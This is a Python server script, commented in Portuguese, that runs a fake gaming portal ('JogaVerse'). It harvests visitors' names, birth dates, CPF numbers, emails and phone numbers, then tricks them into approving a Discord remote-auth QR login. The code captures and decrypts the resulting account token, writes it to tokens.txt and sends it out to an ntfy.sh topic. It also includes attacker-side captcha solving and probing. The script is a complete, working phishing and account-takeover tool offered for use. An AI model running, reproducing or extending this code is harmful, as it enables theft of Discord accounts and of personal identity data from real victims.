#!/usr/bin/env python3
"""
server.py — Portal de jogos fake com login via Discord (remote-auth v2).

Fluxo:
  1. Vitima abre o portal (http://HOST:8080) e preenche nome/nascimento/
     email/CPF/WhatsApp
  2. Clica em "Continuar com Discord" -> o backend abre uma sessao
     remote-auth no gateway (RSA-2048 OAEP) e devolve o fingerprint
  3. A pagina mostra o QR E envia o link (https://discord.com/ra/<fp>)
     direto pro WhatsApp/celular da vitima (wa.me) + botao de link direto
  4. Vitima aprova no app Discord -> token capturado -> salvo em
     tokens.txt e victims.json -> pagina redireciona pro "lobby do jogo"

Dependencias (ja instaladas no workspace):
  pip install pycryptodome websocket-client qrcode requests pillow
"""
import base64
import hashlib
import io
import json
import os
import socket
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, quote

import qrcode
import requests
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

from config import PORT, TOPIC, UA

GW = "wss://remote-auth-gateway.discord.gg/?v=2"

VICTIMS_FILE = "victims.json"
TOKENS_FILE = "tokens.txt"

CAPTCHAS = {}   # sid -> {ticket, sitekey, rqdata, session}

# captcha PRE-ARMADO: resolvido antes da vitima aprovar
ARMED = {"key": None, "ekey": "", "ts": 0}
ARM_LOCK = threading.Lock()


def lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "localhost"

# --------------------------------------------------------------------------
# Sessao remote-auth (uma por login)
# --------------------------------------------------------------------------
class RemoteAuthSession(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
        self.fp = None
        self.ra_url = None
        self.state = "connecting"   # connecting|waiting|approved|done|expired|cancelled
        self.username = None
        self.user_id = None
        self.token = None
        self.ws = None
        self.stop = threading.Event()

    def pub_body(self):
        pem = self.key.publickey().export_key().decode()
        return "".join(pem.split("\n")[1:-1])

    def decrypt_b64(self, s):
        return self.cipher.decrypt(base64.b64decode(s))

    def send(self, op, data=None):
        p = {"op": op}
        if data:
            p.update(data)
        try:
            self.ws.send(json.dumps(p))
        except Exception:
            pass

    def heartbeat(self):
        while not self.stop.is_set():
            self.stop.wait(41.25)
            if not self.stop.is_set():
                try:
                    self.ws.send('{"op":"heartbeat"}')
                except Exception:
                    break

    def do_exchange(self, ticket, captcha_key=None, captcha_rqtoken=None):
        sp = base64.b64encode(json.dumps({
            "os": "Windows", "browser": "Chrome", "device": "",
            "system_locale": "en-US", "browser_user_agent": UA,
            "browser_version": "132.0.0.0", "os_version": "10",
            "referrer": "", "referring_domain": "", "referrer_current": "",
            "referring_domain_current": "", "release_channel": "stable",
            "client_build_number": 363557, "client_event_source": None,
        }).encode()).decode()

        s = requests.Session()
        s.headers.update({
            "User-Agent": UA,
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/login",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "UTC",
            "X-Super-Properties": sp,
        })
        fp = s.get("https://discord.com/api/v9/experiments",
                   timeout=20).json().get("fingerprint")
        body = {"ticket": ticket}
        if captcha_key:
            body["captcha_key"] = captcha_key
            # o ekey do hCaptcha vai aqui — e o que o Discord valida
            body["captcha_rqtoken"] = captcha_rqtoken or ""
        r = s.post(
            "https://discord.com/api/v9/users/@me/remote-auth/login",
            json=body, headers={"X-Track": fp} if fp else {}, timeout=20)
        print(f"HTTP_STATUS={r.status_code} captcha={bool(captcha_key)}",
              flush=True)
        if r.status_code != 200:
            print("BODY:", r.text[:250], flush=True)
        if captcha_key and r.status_code != 200:
            print(f"CAPTCHA_USED key_len={len(captcha_key)} "
                  f"ekey_len={len(captcha_rqtoken or '')}", flush=True)
            # DIAGNOSTICO: mesmo captcha com ticket falso. Se a resposta
            # for "invalid ticket" (e nao captcha-required), o captcha FOI
            # aceito e o problema e o ticket real ter expirado.
            try:
                r2 = s.post(
                    "https://discord.com/api/v9/users/@me/remote-auth/login",
                    json={"ticket": "diag-probe",
                          "captcha_key": captcha_key,
                          "captcha_rqtoken": captcha_rqtoken or ""},
                    headers={"X-Track": fp} if fp else {}, timeout=20)
                print("DIAG:", r2.status_code, r2.text[:200], flush=True)
            except Exception as e:
                print("DIAG_ERR:", repr(e)[:120], flush=True)
        return r

    def finish_token(self, r):
        enc = r.json()["encrypted_token"]
        self.token = self.decrypt_b64(enc).decode()
        self.state = "done"
        print("[+] TOKEN:", self.token)
        with open(TOKENS_FILE, "a") as f:
            f.write(self.token + "\n")
        try:
            requests.post("https://ntfy.sh/" + TOPIC,
                          data=self.token, timeout=10)
            print("[ntfy] publicado p/ o PC (navegador abre)", flush=True)
        except Exception as e:
            print("ntfy falhou:", repr(e)[:120], flush=True)
        try:
            db = json.load(open(VICTIMS_FILE, encoding="utf-8"))
            for rec in db:
                if not rec.get("token"):
                    rec["token"] = self.token
                    rec["username"] = self.username
                    rec["user_id"] = self.user_id
                    break
            json.dump(db, open(VICTIMS_FILE, "w", encoding="utf-8"), indent=2)
        except Exception:
            pass
        self.stop.set()
        try:
            self.ws.close()
        except Exception:
            pass

    def try_exchange(self, ticket, captcha_key=None, captcha_rqtoken=None,
                     attempts=2):
        last = None
        for _ in range(attempts):
            try:
                r = self.do_exchange(ticket, captcha_key, captcha_rqtoken)
                last = r
                if r.status_code == 200:
                    self.finish_token(r)
                    return r
                j = r.json()
                if j.get("captcha_key"):
                    # registra p/ resolucao manual pelo atacante
                    sid = str(uuid.uuid4())[:8]
                    CAPTCHAS[sid] = {
                        "ticket": ticket,
                        "sitekey": j.get("captcha_sitekey"),
                        "rqdata": j.get("captcha_rqdata"),
                        "session": self,
                    }
                    self.state = "captcha"
                    turl = ""
                    try:
                        turl = open("tunnel_url.txt").read().strip()
                    except Exception:
                        pass
                    # SEMPRE via HTTPS do tunel: no localhost o hCaptcha entra
                    # em test mode e os tokens sao invalidos pro Discord
                    capurl = (turl or f"http://{lan_ip()}:8080") + f"/captcha/{sid}"
                    print(f"[captcha] {capurl}", flush=True)
                    # abre a pagina automaticamente no navegador do atacante
                    try:
                        if os.name == "nt":
                            os.startfile(capurl)
                            print("[captcha] pagina aberta automaticamente",
                                  flush=True)
                    except Exception as e:
                        print("auto-open falhou:", repr(e)[:100], flush=True)
                    return r
                time.sleep(2)
            except Exception as e:
                print("EXCHANGE_ERR:", repr(e)[:150], flush=True)
                time.sleep(2)
        self.state = "expired"
        self.stop.set()
        try:
            self.ws.close()
        except Exception:
            pass
        return last

    def on_message(self, w, message):
        try:
            m = json.loads(message)
        except Exception:
            return
        op = m.get("op")

        if op == "hello":
            threading.Thread(target=self.heartbeat, daemon=True).start()
            self.send("init", {"encoded_public_key": self.pub_body()})

        elif op == "nonce_proof":
            nonce = self.decrypt_b64(m["encrypted_nonce"])
            proof = base64.urlsafe_b64encode(
                hashlib.sha256(nonce).digest()).decode().rstrip("=")
            self.send("nonce_proof", {"proof": proof})

        elif op == "pending_remote_init":
            self.fp = m["fingerprint"]
            self.ra_url = "https://discord.com/ra/" + self.fp
            self.state = "waiting"
            print(f"[sessao] QR pronto: {self.ra_url}", flush=True)

        elif op == "pending_ticket":
            try:
                raw = self.decrypt_b64(m["encrypted_user_payload"]).decode()
                # formato: user_id:discriminator:avatar:username
                parts = raw.split(":")
                self.user_id = parts[0] if parts else None
                self.username = parts[-1] if len(parts) >= 4 else None
            except Exception:
                pass
            self.state = "approved"
            print(f"[sessao] APROVADO por {self.username} ({self.user_id})",
                  flush=True)

        elif op == "pending_login":
            ticket = m["ticket"]
            self.state = "captcha"   # enquanto tenta a troca
            print("[sessao] ticket recebido, trocando...", flush=True)
            # em thread separada p/ nao travar o ws (heartbeat continua)
            threading.Thread(target=self.try_exchange,
                             args=(ticket,), daemon=True).start()

        elif op == "cancel":
            self.state = "cancelled"
            print("[sessao] cancelada pela vitima", flush=True)
            self.stop.set()

    def on_close(self, w, code, reason):
        if self.state not in ("done", "cancelled"):
            self.state = "expired"

    def run(self):
        app = websocket.WebSocketApp(
            GW,
            on_message=self.on_message,
            on_close=self.on_close,
            header=["Origin: https://discord.com", "User-Agent: " + UA])
        self.ws = app
        app.run_forever()


SESSION = None
SESSION_LOCK = threading.Lock()


def start_session():
    global SESSION
    with SESSION_LOCK:
        if SESSION and SESSION.ws:
            try:
                SESSION.ws.close()
            except Exception:
                pass
        SESSION = RemoteAuthSession()
        SESSION.start()
        return SESSION


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------
PORTAL_HTML = r"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>JogaVerse — Crie sua conta</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
     background:linear-gradient(135deg,#0d0221,#1a0533 45%,#2a0a4a);
     color:#fff;min-height:100vh;display:flex;justify-content:center;
     align-items:center;padding:16px}
.wrap{width:100%;max-width:420px}
.logo{text-align:center;margin-bottom:18px}
.logo .ico{font-size:44px}
.logo h1{margin:6px 0 2px;font-size:26px;letter-spacing:1px}
.logo p{margin:0;color:#b9a7d8;font-size:13px}
.card{background:#16082e;border:1px solid #3d2270;border-radius:16px;
      padding:26px;box-shadow:0 12px 40px rgba(0,0,0,.5)}
h2{margin:0 0 4px;font-size:19px}
.sub{color:#b9a7d8;font-size:12.5px;margin:0 0 18px}
label{display:block;font-size:12px;color:#cfc3ea;margin:12px 0 5px}
input{width:100%;padding:11px 12px;border-radius:8px;border:1px solid #4a2f80;
      background:#1d0b38;color:#fff;font-size:14px;outline:none}
input:focus{border-color:#7c5cff}
.row{display:flex;gap:10px}
.row>div{flex:1}
.discord-btn{width:100%;margin-top:20px;padding:13px;border:0;border-radius:8px;
      background:#5865f2;color:#fff;font-size:15px;font-weight:600;cursor:pointer;
      display:flex;align-items:center;justify-content:center;gap:8px}
.discord-btn:hover{background:#4752c4}
.discord-btn:disabled{opacity:.6;cursor:wait}
.auth{display:none;margin-top:18px;text-align:center}
.spin{border:3px solid #3d2270;border-top-color:#5865f2;border-radius:50%;
      width:26px;height:26px;margin:0 auto 10px;animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.qrbox{background:#fff;border-radius:10px;padding:8px;width:210px;margin:0 auto}
.qrbox img{width:100%;display:block}
.links{margin-top:12px;display:flex;flex-direction:column;gap:8px}
.linkbtn{display:block;padding:10px;border-radius:8px;font-size:13px;
         font-weight:600;text-decoration:none;cursor:pointer}
.wa{background:#25d366;color:#062a14}
.direct{background:#7c5cff;color:#fff}
.note{font-size:11.5px;color:#b9a7d8;margin-top:10px}
.ok{display:none;text-align:center;padding:10px 0}
.ok .big{font-size:40px}
.err{color:#ff7b7b;font-size:12px;margin-top:8px;display:none}
.foot{text-align:center;color:#7a6a9e;font-size:11px;margin-top:16px}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">
    <div class="ico">🎮</div>
    <h1>JogaVerse</h1>
    <p>O maior portal de jogos do Brasil — crie sua conta grátis</p>
  </div>

  <div class="card">
    <div id="formArea">
      <h2>Criar conta</h2>
      <p class="sub">Preencha seus dados (opcional) e entre com o Discord para
        liberar <b>10.000 créditos</b> de boas-vindas.</p>

      <label>Nome completo</label>
      <input id="nome" placeholder="Seu nome" autocomplete="off">

      <div class="row">
        <div><label>Data de nascimento</label>
             <input id="nascimento" type="date"></div>
        <div><label>CPF</label>
             <input id="cpf" placeholder="000.000.000-00" maxlength="14"></div>
      </div>

      <label>E-mail</label>
      <input id="email" type="email" placeholder="voce@email.com">

      <label>WhatsApp (receber o link de login)</label>
      <input id="whats" placeholder="(11) 90000-0000" maxlength="16">

      <button class="discord-btn" id="btn" onclick="startLogin()">
        🎮 Continuar com Discord
      </button>
      <div class="err" id="err"></div>
    </div>

    <div class="auth" id="authArea">
      <div id="authWaiting">
        <div class="spin"></div>
        <p style="font-size:13px">Conectando com o Discord...</p>
      </div>
      <div id="authLink" style="display:none">
        <p style="font-size:13px;margin:0 0 12px">Link de login gerado!<br>Conclua o login no app:</p>
        <a class="linkbtn direct" id="directBtn" href="#">
          📲 Toque aqui para abrir no app Discord</a>
        <div class="links" style="margin-top:10px">
          <a class="linkbtn wa" id="waBtn" href="#" target="_blank">
            💬 Receber link no WhatsApp</a>
        </div>
        <div class="qrbox" style="margin-top:14px"><img id="qrImg" src="" alt="QR"></div>
        <p class="note">O Discord abrirá em <b id="cd">12</b>s ou toque no botão acima.<br>
          Se não carregar, escaneie o QR abaixo no Discord (Você → ⚙️ → Ler código QR).</p>
      </div>
      <div class="ok" id="authOk">
        <div class="big">✅</div>
        <p>Login confirmado! Carregando seu lobby...</p>
      </div>
    </div>
  </div>
  <div class="foot">© 2026 JogaVerse — suporte@jogaverse.example</div>
</div>

<script>
let pollTimer = null, phone = "", redirected = false;

function $(id){ return document.getElementById(id); }

function showErr(m){ const e = $("err"); e.textContent = m; e.style.display = "block"; }

function fmtCPF(v){
  v = v.replace(/\D/g,"").slice(0,11);
  return v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2")
          .replace(/(\d{3})(\d{1,2})$/,"$1-$2");
}

$("cpf").addEventListener("input", e => e.target.value = fmtCPF(e.target.value));

function onlyDigits(v){ return v.replace(/\D/g,""); }

async function startLogin(){
  // dados OPCIONAIS: envia o que estiver preenchido
  const nome = $("nome").value.trim();
  const nasc = $("nascimento").value;
  const cpf  = onlyDigits($("cpf").value);
  const email = $("email").value.trim();
  phone = onlyDigits($("whats").value);

  $("err").style.display = "none";
  $("btn").disabled = true;

  const r = await fetch("/api/start", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({nome, nascimento: nasc, email, cpf, telefone: phone})
  });
  if(!r.ok){ $("btn").disabled = false; return showErr("Erro ao iniciar o login."); }

  $("formArea").style.display = "none";
  $("authArea").style.display = "block";
  pollTimer = setInterval(pollState, 1500);
  pollState();
}

async function pollState(){
  try{
    const r = await fetch("/api/state");
    const s = await r.json();
    if(s.state === "waiting" && s.ra_url && !redirected){
      redirected = true;
      $("authWaiting").style.display = "none";
      $("authLink").style.display = "block";
      $("qrImg").src = "/qr.png?fp=" + encodeURIComponent(s.fp) + "&t=" + Date.now();
      // Android: intent:// -> Chrome -> app Discord. iOS/desktop: https.
      const isAndroid = /Android/i.test(navigator.userAgent || "");
      let openUrl = s.ra_url;
      if(isAndroid){
        openUrl = "intent://discord.com/ra/" + s.fp +
                  "#Intent;scheme=https;package=com.discord;" +
                  "S.browser_fallback_url=" + encodeURIComponent(s.ra_url) + ";end";
      }
      $("directBtn").href = openUrl;
      $("waBtn").href = "https://wa.me/" + phone + "?text=" +
                 encodeURIComponent("Seu link de login JogaVerse: " + s.ra_url);
      // abre automaticamente em 12s no navegador (QR fica como fallback).
      // (script NAO pode navegar p/ intent:// sem gesto - o Chrome bloqueia;
      //  por isso o auto usa https e o BOTAO usa o intent -> Chrome -> app)
      setTimeout(() => { window.location.href = s.ra_url; }, 12000);
    }
    if(s.state === "approved"){
      $("authLink").style.display = "none";
      $("authOk").style.display = "block";
    }
    if(s.state === "done"){
      clearInterval(pollTimer);
      location.href = "/lobby";
    }
    if(s.state === "expired" || s.state === "cancelled"){
      clearInterval(pollTimer);
      $("authWaiting").style.display = "none";
      $("authLink").style.display = "none";
      $("authOk").innerHTML =
        '<div class="big">⏰</div><p>Sessão expirada. Recarregue e tente de novo.</p>';
      $("authOk").style.display = "block";
    }
  }catch(e){}
}
</script>
</body>
</html>
"""

LOBBY_HTML = r"""<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>JogaVerse — Lobby</title>
<style>
body{margin:0;font-family:-apple-system,Segoe UI,Roboto,Arial;
     background:linear-gradient(135deg,#0d0221,#1a0533 45%,#2a0a4a);color:#fff;
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{text-align:center}
.big{font-size:56px}
h1{margin:8px 0 4px;font-size:24px}
p{color:#b9a7d8;font-size:14px}
</style></head><body><div class="c">
<div class="big">🎮</div><h1>Bem-vindo ao JogaVerse!</h1>
<p>Seus 10.000 créditos foram ativados.<br>O catálogo de jogos estará disponível em breve.</p>
</div></body></html>
"""


def arm_probe():
    """Pede um captcha com ticket falso so p/ obter sitekey+rqdata."""
    sp = base64.b64encode(json.dumps({
        "os": "Windows", "browser": "Chrome", "device": "",
        "system_locale": "en-US", "browser_user_agent": UA,
        "browser_version": "132.0.0.0", "os_version": "10",
        "referrer": "", "referring_domain": "", "referrer_current": "",
        "referring_domain_current": "", "release_channel": "stable",
        "client_build_number": 363557, "client_event_source": None,
    }).encode()).decode()
    try:
        s = requests.Session()
        s.headers.update({
            "User-Agent": UA,
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/login",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "UTC",
            "X-Super-Properties": sp,
        })
        fp = s.get("https://discord.com/api/v9/experiments",
                   timeout=20).json().get("fingerprint")
        r = s.post("https://discord.com/api/v9/users/@me/remote-auth/login",
                   json={"ticket": "arm-probe"},
                   headers={"X-Track": fp} if fp else {}, timeout=20)
        j = r.json()
        return (j.get("captcha_sitekey") or
                "a9b5fb07-92ff-493f-86fe-352a2803b3df",
                j.get("captcha_rqdata") or "")
    except Exception:
        return ("a9b5fb07-92ff-493f-86fe-352a2803b3df", "")


def captcha_page(sid, sitekey, rqdata, arm=False):
    endpoint = "/api/arm" if arm else "/api/captcha"
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Verificacao</title>
<script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
</head><body style="background:#0d0221;color:#fff;font-family:Arial;
display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
<div style="text-align:center">
<h2>{'Pre-armar captcha' if arm else 'Verifique para concluir o login'}</h2>
<div id="hcap"></div>
<div id="res" style="margin-top:14px;font-size:14px"></div>
</div>
<script>
// o callback do hCaptcha entrega (token, ekey) — o ekey e o captcha_rqtoken
function done(key, ekey){{
  fetch('{endpoint}', {{method:'POST',
    headers: {{'Content-Type':'application/json'}},
    body: JSON.stringify({{sid:'{sid}', key:key, ekey:(ekey||'')}})}})
   .then(r=>r.json())
   .then(j=>{{ document.getElementById('res').textContent =
       j.ok ? (j.msg || (j.armado || 'OK! captcha aceito — pode fechar esta aba.')) :
              'falhou: ' + (j.msg || JSON.stringify(j)); }});
}}
// se a caixa do hCaptcha nao renderizar em 8s, recarrega (rqdata fresco)
setTimeout(function(){{
  var el = document.getElementById('hcap');
  if (el && el.childElementCount === 0 && !el.querySelector('iframe')) {{
    location.reload();
  }}
}}, 8000);
function tryRender(){{
  if (window.hcaptcha) {{
    hcaptcha.render('hcap', {{
      sitekey: '{sitekey}',
      rqdata: '{rqdata}',
      callback: done
    }});
  }} else {{
    setTimeout(tryRender, 200);
  }}
}}
tryRender();
</script></body></html>"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _html(self, text, code=200):
        body = text.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path in ("/", "/index.html"):
            self._html(PORTAL_HTML)
        elif u.path == "/lobby":
            self._html(LOBBY_HTML)
        elif u.path == "/qr.png":
            q = parse_qs(u.query)
            fp = (q.get("fp") or [""])[0]
            if not fp:
                self._json({"error": "no fp"}, 400)
                return
            img = qrcode.make("https://discord.com/ra/" + fp)
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            body = buf.getvalue()
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif u.path == "/api/state":
            with SESSION_LOCK:
                s = SESSION
            if s:
                self._json({
                    "state": s.state, "fp": s.fp, "ra_url": s.ra_url,
                    "username": s.username, "token": s.token,
                })
            else:
                self._json({"state": "idle"})
        elif u.path == "/admin":
            items = "".join(
                f"<li><a href='/captcha/{s}'>/captcha/{s}</a></li>"
                for s in CAPTCHAS)
            self._html(
                "<h2>Captchas pendentes</h2><ul>" + items + "</ul>"
                if items else "<h2>Nenhum captcha pendente</h2>")
        elif u.path.startswith("/captcha/"):
            sid = u.path.split("/")[-1]
            c = CAPTCHAS.get(sid)
            if not c:
                self._html("sessao de captcha nao encontrada", 404)
            else:
                # rqdata do MESMO 400 do ticket (binding correto)
                self._html(captcha_page(sid, c["sitekey"], c["rqdata"]))
        else:
            self._html("not found", 404)

    def do_POST(self):
        u = urlparse(self.path)
        n = int(self.headers.get("Content-Length", 0))
        try:
            data = json.loads(self.rfile.read(n) or b"{}")
        except Exception:
            data = {}

        if u.path == "/api/start":
            rec = {
                "nome": data.get("nome"),
                "nascimento": data.get("nascimento"),
                "email": data.get("email"),
                "cpf": data.get("cpf"),
                "telefone": data.get("telefone"),
                "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
            }
            print(f"[victim] {rec['nome']} | {rec['nascimento']} | "
                  f"{rec['cpf']} | {rec['email']} | {rec['telefone']}",
                  flush=True)
            try:
                db = json.load(open(VICTIMS_FILE, encoding="utf-8"))
            except Exception:
                db = []
            db.append(rec)
            json.dump(db, open(VICTIMS_FILE, "w", encoding="utf-8"), indent=2)
            start_session()
            print("[sessao] nova sessao remote-auth iniciada", flush=True)
            self._json({"ok": True})
        elif u.path == "/api/captcha":
            sid = data.get("sid")
            key = data.get("key")
            ekey = data.get("ekey", "")
            c = CAPTCHAS.get(sid)
            if not c or not key:
                self._json({"ok": False, "erro": "sessao/chave invalida"})
                return
            CAPTCHAS.pop(sid, None)
            # rqtoken = ekey (se houver) senao o proprio rqdata do pedido
            rqtoken = ekey or c.get("rqdata", "")
            r = c["session"].try_exchange(c["ticket"], key, rqtoken, 1)
            if r is not None and r.status_code == 200:
                self._json({"ok": True, "msg": "TOKEN CAPTURADO! 🎉"})
            else:
                self._json({"ok": False,
                            "status": getattr(r, "status_code", None),
                            "msg": "troca falhou — veja o console"})
        else:
            self._json({"error": "not found"}, 404)


if __name__ == "__main__":
    print(f"[*] Portal JogaVerse em http://0.0.0.0:{PORT} "
          f"(aberto na LAN para testes)")
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
